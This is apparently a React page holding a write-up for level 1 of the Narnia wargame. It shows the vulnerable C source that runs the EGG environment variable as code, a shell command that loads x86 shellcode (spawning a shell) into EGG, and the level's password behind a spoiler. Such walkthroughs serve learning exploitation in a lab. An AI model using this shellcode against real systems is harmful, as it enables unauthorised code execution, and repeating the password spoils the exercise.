import CodeBlock from "../../components/elements/CodeBlock/CodeBlock"
import PageNav from "../../components/elements/PageNav/PageNav"
import SpoilerKey from "../../components/elements/SpoilerKey/SpoilerKey"

const narnia1 = () => {
  return (
    <div>
      <h1>Narnia 1</h1>
      <section>
        <h2>Experience</h2>
        <p>
          Starting this level, we again start by looking at the source code.
        </p>
        <CodeBlock language="c">{`int main(){
int (*ret)();

if(getenv("EGG")==NULL){
  printf("Give me something to execute at the env-variable EGG\n");
  exit(1);
}

printf("Trying to execute EGG!\n");
ret = getenv("EGG");
ret();

return 0;
}`}</CodeBlock>
        <p>
          We may observe several interesting thing, first a declaration of a
          pointer called <code>ret</code> which points to a function. There is also
          a usage of <code>getenv</code> which gets an environment variable, which here
          seems to be called <em>EGG</em>. It then sets the function pointer to
          whatever is inside the EGG environment varialbe and then executes it. So,
          clearly, we must insert some type of program into the EGG environment variable
          to obtain the password for Narnia 2.
        </p>
        <p>
          I could understand so far that we must set the environment variable to
          something executable, however, I did not know how to proceed. Searching
          setting environment variable vulnerabilities led to a <a href="https://owasp.org/www-community/attacks/Buffer_Overflow_via_Environment_Variables">page in owasp.org</a>.
          
        </p>
      </section>
      <CodeBlock language="shell">
        {`export EGG=$(python -c 'print("\\x31\\xc9\\xf7\\xe1\\x51\\xbf\\xd0\\xd0\\x8c\\x97\\xbe\\xd0\\x9d\\x96\\x91\\xf7\\xd7\\xf7\\xd6\\x57\\x56\\x89\\xe3\\xb0\\x0b\\xcd\\x80")')`}
      </CodeBlock>
      <SpoilerKey>{`nairiepecu`}</SpoilerKey>
      <PageNav link1='/narnia/narnia0' link2='/narnia/narnia2' />
    </div>
  )
}
export default narnia1